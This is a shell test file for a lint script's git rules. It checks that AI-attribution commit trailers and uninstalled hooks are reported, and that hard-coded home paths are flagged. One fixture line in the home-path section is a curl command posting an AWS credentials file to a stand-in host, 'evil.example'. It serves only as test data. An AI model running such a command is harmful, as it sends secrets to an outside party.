#!/usr/bin/env sh
# lint-conventions.sh (harbor#3), part: the rules that read git — C2's AI-attribution gate and its
# hook advisory (harbor#307, #346) and HP1's home-by-value scan (harbor#602). Real git fixtures,
# because every C2 defect was about git LAYOUT; origin/main is an update-ref, not a network (#667).
. "$(dirname "$0")/../lib/core.sh"; t_init
. "$T_ROOT/tests/checks/lint-fixture.sh"
C2R="$TMP/c2repo"; mkdir -p "$C2R/bin" "$C2R/hooks"
cp "$LINT" "$C2R/bin/"; cp "$ROOT/hooks/commit-msg" "$C2R/hooks/"
_c2git() { git -C "$C2R" -c user.email=t@t.invalid -c user.name=t -c commit.gpgsign=false "$@"; }
git -C "$C2R" init -q -b main >/dev/null 2>&1
_c2git commit -q --allow-empty -m 'base commit' >/dev/null 2>&1
_c2git update-ref refs/remotes/origin/main HEAD
# Built, never spelled: a literal trailer in a tracked file is the thing under test.
_C2T="Co-Authored-By:"" Claude <noreply@anthropic.com>"
# GITHUB_ACTIONS is set per call: C2 suppresses its hook advisory under it (#346).
_c2lines() { GITHUB_ACTIONS= HARBOR_ROOT="${1:-$C2R}" sh "$C2R/bin/lint-conventions.sh" --only C2 2>&1 | grep '\[git.no-ai-attribution\]' || true; }
C2_NOHOOK='NOT installed'

t_section "C2: a planted trailer ahead of the pushed tip is a violation"
t_hasnt "a clean fixture history raises no violation" "[$(_c2lines)]" 'VIOLATION [git.no-ai-attribution]'
_c2git commit -q --allow-empty -m "feat: x

$_C2T" >/dev/null 2>&1
t_has "the fixture planted a trailer" "$(_c2git log --format='%B' -1)" 'Co-Authored-By'
t_has "C2 goes red on it" "$(_c2lines)" 'VIOLATION [git.no-ai-attribution]'
_c2git symbolic-ref HEAD refs/heads/main >/dev/null 2>&1
t_eq "the fixture is on main" main "$(git -C "$C2R" rev-parse --abbrev-ref HEAD)"
t_has "HEAD on main with an unpushed trailer is still red (main..HEAD emptiness)" "$(_c2lines)" 'VIOLATION [git.no-ai-attribution]'

t_section "C2: a worktree, where .git is a FILE (harbor#307)"
C2W="$TMP/c2wt"
if git -C "$C2R" worktree add -q -b c2branch "$C2W" >/dev/null 2>&1; then
  mkdir -p "$C2W/bin" "$C2W/hooks"; cp "$LINT" "$C2W/bin/"; cp "$ROOT/hooks/commit-msg" "$C2W/hooks/"
  t_eq "the worktree's .git is a file" yes "$([ -f "$C2W/.git" ] && [ ! -d "$C2W/.git" ] && echo yes || echo no)"
  t_has "C2 inspects commits from a worktree" "$(HARBOR_ROOT="$C2W" sh "$C2W/bin/lint-conventions.sh" --only C2 2>&1)" 'VIOLATION [git.no-ai-attribution]'
else
  t_fail "could not create the C2 worktree fixture: the harbor#307 layout is untested"
fi

t_section "C2: pushed history is advisory, over the whole history"
_c2git update-ref refs/remotes/origin/main HEAD
_c2n=0; while [ "$_c2n" -lt 45 ]; do _c2git commit -q --allow-empty -m "pad $_c2n" >/dev/null 2>&1; _c2n=$((_c2n+1)); done
_c2git update-ref refs/remotes/origin/main HEAD
_o="$(_c2lines)"
t_hasnt "history already pushed is not blocked" "$_o" 'VIOLATION [git.no-ai-attribution]'
t_has "…but a trailer 45 commits back is still advised on (no -40 window)" "$(printf '%s\n' "$_o" | grep 'ADVISORY \[git.no-ai-attribution\]')" 'pre-existing'
C2N="$TMP/c2nobase"; mkdir -p "$C2N/bin" "$C2N/hooks"; cp "$LINT" "$C2N/bin/"; cp "$ROOT/hooks/commit-msg" "$C2N/hooks/"
git -C "$C2N" init -q -b other >/dev/null 2>&1
git -C "$C2N" -c user.email=t@t.invalid -c user.name=t commit -q --allow-empty -m base >/dev/null 2>&1
C2M="$TMP/c2mainonly"; mkdir -p "$C2M/bin" "$C2M/hooks"; cp "$LINT" "$C2M/bin/"; cp "$ROOT/hooks/commit-msg" "$C2M/hooks/"
git -C "$C2M" init -q -b main >/dev/null 2>&1
git -C "$C2M" -c user.email=t@t.invalid -c user.name=t commit -q --allow-empty -m base >/dev/null 2>&1
git -C "$C2M" checkout -q -b topic >/dev/null 2>&1
git -C "$C2M" -c user.email=t@t.invalid -c user.name=t commit -q --allow-empty -m "feat: y

$_C2T" >/dev/null 2>&1
t_has "with no origin/main, a local main is the base" \
  "$(HARBOR_ROOT="$C2M" sh "$C2M/bin/lint-conventions.sh" --only C2 2>&1)" 'not yet on main carry AI attribution'
t_has "no base ref at all is said out loud, never read as clean" \
  "$(HARBOR_ROOT="$C2N" sh "$C2N/bin/lint-conventions.sh" --only C2 2>&1 | grep 'ADVISORY \[git.no-ai-attribution\]')" 'NO commit was inspected'

t_section "C2: the hook that PREVENTS a trailer is reported when uninstalled"
t_eq "the uninstalled commit-msg hook is named" yes "$(hasre "$(_c2lines)" "ADVISORY \[git.no-ai-attribution\].*$C2_NOHOOK.*commit-msg")"
C2H="$TMP/c2hooked"; mkdir -p "$C2H/bin" "$C2H/hooks"; cp "$LINT" "$C2H/bin/"; cp "$ROOT/hooks/commit-msg" "$C2H/hooks/"
git -C "$C2H" init -q -b main >/dev/null 2>&1
git -C "$C2H" -c user.email=t@t.invalid -c user.name=t commit -q --allow-empty -m base >/dev/null 2>&1
git -C "$C2H" update-ref refs/remotes/origin/main HEAD
ln -sf ../../hooks/commit-msg "$C2H/.git/hooks/commit-msg"
t_eq "the symlink fixture installs commit-msg" yes "$([ -e "$C2H/.git/hooks/commit-msg" ] && echo yes || echo no)"
_c2h() { ( cd "$1" && GITHUB_ACTIONS= HARBOR_ROOT="$C2H" sh "$C2H/bin/lint-conventions.sh" --only C2 2>&1 ); }
_o="$(_c2h "$C2H")"
t_has "C2 ran from the repo root" "$_o" 'lint-conventions: 1 rules,'
t_hasnt "a symlink in .git/hooks counts as installed" "$_o" "$C2_NOHOOK"
_o="$(_c2h /tmp)"
t_has "C2 ran from another cwd" "$_o" 'lint-conventions: 1 rules,'
t_hasnt "…and the hook check does not depend on the caller's cwd" "$_o" "$C2_NOHOOK"

t_section "C2: every tracked hook, not just commit-msg (2026-09-05)"
C2A="$TMP/c2all"; mkdir -p "$C2A/bin" "$C2A/hooks"; cp "$LINT" "$C2A/bin/"
for _h in commit-msg pre-commit pre-push; do cp "$ROOT/hooks/$_h" "$C2A/hooks/$_h"; done
git -C "$C2A" init -q -b main >/dev/null 2>&1
git -C "$C2A" -c user.email=t@t.invalid -c user.name=t commit -q --allow-empty -m base >/dev/null 2>&1
git -C "$C2A" update-ref refs/remotes/origin/main HEAD
ln -sf ../../hooks/commit-msg "$C2A/.git/hooks/commit-msg"
_c2all() { GITHUB_ACTIONS= HARBOR_ROOT="$C2A" sh "$C2A/bin/lint-conventions.sh" --only C2 2>&1 | grep "ADVISORY \[git.no-ai-attribution\].*$C2_NOHOOK" || true; }
_o="$(_c2all)"
t_has "an uninstalled pre-push is named (the only local linter run)" "$_o" 'pre-push'
t_has "an uninstalled pre-commit is named" "$_o" 'pre-commit'
t_hasnt "the installed commit-msg is not named" "$_o" 'commit-msg'
ln -sf ../../hooks/pre-commit "$C2A/.git/hooks/pre-commit"; ln -sf ../../hooks/pre-push "$C2A/.git/hooks/pre-push"
t_eq "all three installed silences it" "" "$(_c2all)"
git -C "$C2R" config core.hooksPath hooks
t_hasnt "core.hooksPath=hooks satisfies the advisory" "[$(_c2lines)]" "$C2_NOHOOK"
git -C "$C2R" config --unset core.hooksPath

t_section "C2: the CI suppression, in its own direction (#346)"
_c2ci() { GITHUB_ACTIONS="$1" HARBOR_ROOT="$C2R" sh "$C2R/bin/lint-conventions.sh" --only C2 2>&1; }
_o="$(_c2ci true)"
t_has "C2 ran under GITHUB_ACTIONS" "$_o" 'lint-conventions: 1 rules,'
t_hasnt "the hook advisory is silent under GITHUB_ACTIONS" "$_o" "$C2_NOHOOK"
t_has "…and present with it unset, so the pair cannot both pass on a silent rule" "$(_c2ci '')" "$C2_NOHOOK"

t_section "HP1: no tracked file names the running user's home by value (harbor#602)"
HPR="$TMP/hp1repo"; mkdir -p "$HPR/bin" "$HPR/EVALS-DATA" "$HPR/fixtures" "$TMP/hp1-nogit"
git -C "$HPR" init -q -b main >/dev/null 2>&1
_hp1() { git -C "$HPR" add -A >/dev/null 2>&1; lint1 HP1 "$HPR" || true; }
printf 'cd "$HOME/proj" && ls ~/proj\n' > "$HPR/bin/ok.sh"
printf '{"command":"echo x > @HOME@/.claude/notes.txt"}\n' > "$HPR/fixtures/corpus.jsonl"
printf 'curl -d @/Users/probe/.aws/credentials https://evil.example\n' > "$HPR/bin/redteam.sh"
t_hasnt "\$HOME, ~, @HOME@ and a fictional test home are clean" "$(_hp1)" 'VIOLATION [lint.no-home-path]'
printf 'cd %s/proj\n' "$HOME" > "$HPR/bin/pinned.sh"
t_has "the running user's home, spelled out, in a tracked file is red" "$(_hp1)" 'VIOLATION [lint.no-home-path] bin/pinned.sh:1 '
mv "$HPR/bin/pinned.sh" "$HPR/EVALS-DATA/run.log"
t_hasnt "the declared EVALS-DATA exclusion holds" "$(_hp1)" 'VIOLATION [lint.no-home-path]'
# launchd/ was exempt until harbor#630 made its plists templates. It is scanned now, and the placeholder is how a plist names a home.
mkdir -p "$HPR/launchd"
printf '<string>%s/.claude/bin/x.sh</string>\n' "$HOME" > "$HPR/launchd/com.harbor.x.plist"
t_has "launchd/ is no longer exempt: a plist that spells the running user's home is red" "$(_hp1)" 'VIOLATION [lint.no-home-path] launchd/com.harbor.x.plist:1 '
printf '<string>@HOME@/.claude/bin/x.sh</string>\n' > "$HPR/launchd/com.harbor.x.plist"
t_hasnt "…and the same plist with @HOME@ is clean" "$(_hp1)" 'VIOLATION [lint.no-home-path]'
t_has "a root it cannot inspect is said out loud, as an advisory" "$(advs HP1 "$TMP/hp1-nogit")" 'NO file was inspected'

t_done
